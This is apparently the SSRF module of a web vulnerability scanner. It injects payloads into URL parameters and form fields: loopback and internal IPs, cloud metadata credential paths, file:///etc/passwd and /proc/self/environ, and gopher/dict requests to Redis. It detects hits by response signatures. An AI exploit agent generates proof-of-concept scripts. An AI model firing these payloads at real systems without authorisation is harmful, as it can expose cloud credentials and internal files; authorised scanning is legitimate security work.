"""
cyberm4fia-scanner - SSRF Module
Server-Side Request Forgery detection (Threaded)
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.colors import log_info, log_success, log_vuln
from utils.request import (
    get_oob_client,
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from modules.payloads import load_payloads_from_file
from utils.payload_filter import PayloadFilter
from typing import Any, Optional
from utils.request import ScanExceptions

# SSRF Payloads: loaded from file + hardcoded fallback
_SSRF_FALLBACK = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://127.1",
    # Cloud metadata
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # File protocol
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    # Dict protocol
    "dict://127.0.0.1:22/",
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
    # Gopher protocol
    "gopher://127.0.0.1:25/",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    # Internal network
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.1.1",
    "http://192.168.0.1",
]

SSRF_PAYLOADS = load_payloads_from_file("ssrf.txt", _SSRF_FALLBACK)

# Strong SSRF indicators — things that should NOT appear on a normal page
SSRF_STRONG_SIGNATURES = {
    "aws_metadata": [
        "ami-id",
        "instance-id",
        "instance-type",
        "local-hostname",
        "public-hostname",
        "security-credentials",
    ],
    "cloud_metadata": [
        "computeMetadata",
        "openstack",
        "digitalocean",
    ],
    "internal_service": [
        "openssh",
        "ssh-2.0",
        "220 ",  # FTP/SMTP banner
        "mysql_native_password",
        "+OK POP3",
        "IMAP4rev1",
        "redis_version",
        "memcached",
    ],
    "file_read": [
        "root:x:0:0:",
        "root:*:0:0:",
        "[boot loader]",
        "for 16-bit app",
        "127.0.0.1\tlocalhost",
        "PROCESSOR_",
    ],
    "internal_error": [
        "connection refused",
        "no route to host",
        "getaddrinfo failed",
    ],
}

# Param names that are likely to accept URLs (only used for URL params)
SSRF_PARAM_NAMES = [
    "url",
    "uri",
    "path",
    "dest",
    "redirect",
    "return",
    "next",
    "target",
    "rurl",
    "out",
    "view",
    "feed",
    "host",
    "site",
    "ref",
    "data",
    "load",
    "callback",
    "return_url",
    "redirect_url",
    "img",
    "image",
    "src",
    "source",
    "link",
    "to",
    "from",
    "page",
]

def _get_baseline(url, params, parsed):
    """Get baseline response for comparison."""
    try:
        resp = smart_request("get", url, delay=0)
        return resp.text, len(resp.text)
    except ScanExceptions:
        return "", 0

def detect_ssrf(text, payload, baseline_text="", baseline_len=0):
    """Check response for SSRF indicators using baseline comparison."""
    text_lower = text.lower()
    resp_len = len(text)

    # 1. Check for strong signatures (always a finding)
    for category, sigs in SSRF_STRONG_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in text_lower:
                # Make sure this signature wasn't in the baseline response
                if sig.lower() not in baseline_text.lower():
                    return category, sig

    # 2. Check for significant content change from baseline
    # If the response is VERY different from baseline, it might be SSRF
    # Dynamic sites have changing nonces/timestamps. We need a higher tolerance.
    if baseline_len > 0 and resp_len > 0:
        len_diff = abs(resp_len - baseline_len)
        ratio = len_diff / max(baseline_len, 1)

        # If content changed by >70% AND response has internal indicators
        if ratio > 0.70:
            # Look for internal page indicators that weren't in baseline
            internal_indicators = [
                "it works!",
                "welcome to",
                "default page",
                "directory listing",
                "index of /",
                "server at",
                "port ",
            ]
            for ind in internal_indicators:
                if ind in text_lower and ind not in baseline_text.lower():
                    return "internal_page", ind

    return None, None

import functools
from utils.concurrency import run_concurrent_tasks

def _test_ssrf_param_payload(payload, param, params, parsed, delay, baseline_text, baseline_len):
    test_params = params.copy()
    test_params[param] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
    try:
        resp = smart_request("get", test_url, delay=delay)
        category, sig = detect_ssrf(resp.text, payload, baseline_text, baseline_len)
        if category:
            increment_vulnerability_count()
            log_vuln("SSRF VULNERABILITY FOUND!")
            log_success(f"Param: {param} | Type: {category} | Indicator: {sig}")
            log_success(f"Payload: {payload}")
            return {
                "type": "SSRF_Param",
                "param": param,
                "payload": payload,
                "category": category,
                "signature": sig,
                "url": test_url,
            }
    except ScanExceptions:
        pass
    return None

def _test_ssrf_form_payload(payload, inp, inputs, hidden_data, method, target, delay, baseline_text, baseline_len):
    data = {n: "test" for n in inputs}
    if hidden_data:
        data.update(hidden_data)
    data[inp] = payload
    try:
        resp = smart_request(
            method,
            target,
            data=data if method == "post" else None,
            params=data if method != "post" else None,
            delay=delay,
        )
        category, sig = detect_ssrf(resp.text, payload, baseline_text, baseline_len)
        if category:
            increment_vulnerability_count()
            log_vuln("SSRF VULNERABILITY FOUND!")
            log_success(f"Form field: {inp} | Type: {category}")
            log_success(f"Payload: {payload}")
            return {
                "type": "SSRF_Form",
                "field": inp,
                "payload": payload,
                "category": category,
                "signature": sig,
                "url": target,
                "method": method,
            }
    except ScanExceptions:
        pass
    return None

def scan_ssrf(url: str, forms: list, delay: float, options: Optional[dict] = None, threads: Optional[int] = None) -> list:
    if threads is None:
        threads = get_thread_count()
        
    options = options or {}
    target_context = options.get("target_context")

    log_info(f"Testing SSRF with {len(SSRF_PAYLOADS)} payloads ({threads} threads)...")
    vulns = []
    tasks = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    baseline_text, baseline_len = _get_baseline(url, params, parsed)

    existing_params = list(params.keys())
    params_to_test = existing_params if existing_params else []

    if params_to_test:
        log_info(f"  → Testing {len(params_to_test)} URL params: {', '.join(params_to_test)}")
    else:
        log_info("  → No URL params to test for SSRF")

    all_payloads = list(SSRF_PAYLOADS)
    if target_context:
        all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)

    for param in params_to_test:
        param_payloads = list(all_payloads)
        oob_client = get_oob_client()
        if oob_client and oob_client.ready:
            param_payloads.append(oob_client.generate_payload("ssrf", param))
            
        for payload in param_payloads:
            tasks.append(functools.partial(_test_ssrf_param_payload, payload, param, params, parsed, delay, baseline_text, baseline_len))

    for form in forms:
        action = form.get("action") or url
        method = form.get("method", "get").lower()
        target = urljoin(url, action)
        all_inputs = form.find_all(["input", "textarea"])
        inputs = [i.get("name") for i in all_inputs if i.get("name")]
        hidden_data = {i.get("name"): i.get("value", "") for i in all_inputs if i.get("type") == "hidden" and i.get("name")}
        url_fields = [inp for inp in inputs if inp.lower() in SSRF_PARAM_NAMES]

        for inp in url_fields:
            inp_payloads = list(all_payloads)
            oob_client = get_oob_client()
            if oob_client and oob_client.ready:
                inp_payloads.append(oob_client.generate_payload("ssrf", inp))
                
            for payload in inp_payloads:
                tasks.append(functools.partial(_test_ssrf_form_payload, payload, inp, inputs, hidden_data, method, target, delay, baseline_text, baseline_len))

    vulns.extend(run_concurrent_tasks(tasks, max_workers=threads))

    if not vulns and params:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for param in params:
                    ctx = ExploitContext(url=url, param=param, vuln_type="SSRF", waf=waf_name, http_method="GET")
                    result = agent.exploit_ssrf(ctx)
                    if result and result.success:
                        increment_vulnerability_count()
                        log_vuln(f"SSRF in: {param} [AI Agent Gen-{result.iteration}]")
                        vulns.append({
                            "type": "SSRF",
                            "url": url,
                            "param": param,
                            "payload": result.payload,
                            "evidence": result.evidence[:200],
                            "severity": "HIGH",
                            "description": f"AI-discovered SSRF in '{param}'. Confidence: {result.confidence:.0f}%",
                            "source": f"AI Agent (Gen-{result.iteration})",
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        break
        except ImportError:
            pass

    return vulns

# ── Async version ─────────────────────────────────────────────────────────

async def async_scan_ssrf(url: str, forms: list, delay: float, options: Optional[dict] = None) -> list:
    """Async version of scan_ssrf — uses asyncio.gather instead of ThreadPoolExecutor."""
    import asyncio
    from utils.async_request import async_smart_request, get_async_client

    options = options or {}
    target_context = options.get("target_context")

    log_info(f"Testing SSRF (async) with {len(SSRF_PAYLOADS)} payloads...")
    vulns = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Baseline
    async with get_async_client() as client:
        try:
            resp = await async_smart_request(client, "get", url, delay=0)
            baseline_text, baseline_len = resp.text, len(resp.text)
        except ScanExceptions:
            baseline_text, baseline_len = "", 0

        async def _test_param(param):
            all_payloads = list(SSRF_PAYLOADS)
            if target_context:
                all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)

            for payload in all_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                try:
                    resp = await async_smart_request(client, "get", test_url, delay=delay)
                    category, sig = detect_ssrf(resp.text, payload, baseline_text, baseline_len)
                    if category:
                        increment_vulnerability_count()
                        log_vuln("SSRF VULNERABILITY FOUND!")
                        log_success(f"Param: {param} | Type: {category} | Indicator: {sig}")
                        return {
                            "type": "SSRF_Param",
                            "param": param,
                            "payload": payload,
                            "category": category,
                            "signature": sig,
                            "url": test_url,
                        }
                except ScanExceptions:
                    pass
            return None

        async def _test_form(inp, inputs, hidden_data, method, target):
            all_payloads = list(SSRF_PAYLOADS)
            if target_context:
                all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)

            for payload in all_payloads:
                data = {n: "test" for n in inputs}
                if hidden_data:
                    data.update(hidden_data)
                data[inp] = payload
                try:
                    resp = await async_smart_request(
                        client, method, target,
                        data=data if method == "post" else None,
                        params=data if method != "post" else None,
                        delay=delay,
                    )
                    category, sig = detect_ssrf(resp.text, payload, baseline_text, baseline_len)
                    if category:
                        increment_vulnerability_count()
                        log_vuln("SSRF VULNERABILITY FOUND!")
                        return {
                            "type": "SSRF_Form",
                            "field": inp,
                            "payload": payload,
                            "category": category,
                            "signature": sig,
                            "url": target,
                            "method": method,
                        }
                except ScanExceptions:
                    pass
            return None

        tasks = []
        existing_params = list(params.keys())
        for param in existing_params:
            tasks.append(_test_param(param))

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            all_inputs = form.find_all(["input", "textarea"])
            inputs = [i.get("name") for i in all_inputs if i.get("name")]
            hidden_data = {
                i.get("name"): i.get("value", "")
                for i in all_inputs
                if i.get("type") == "hidden" and i.get("name")
            }
            url_fields = [inp for inp in inputs if inp.lower() in SSRF_PARAM_NAMES]
            for inp in url_fields:
                tasks.append(_test_form(inp, inputs, hidden_data, method, target))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict):
                vulns.append(result)

    return vulns
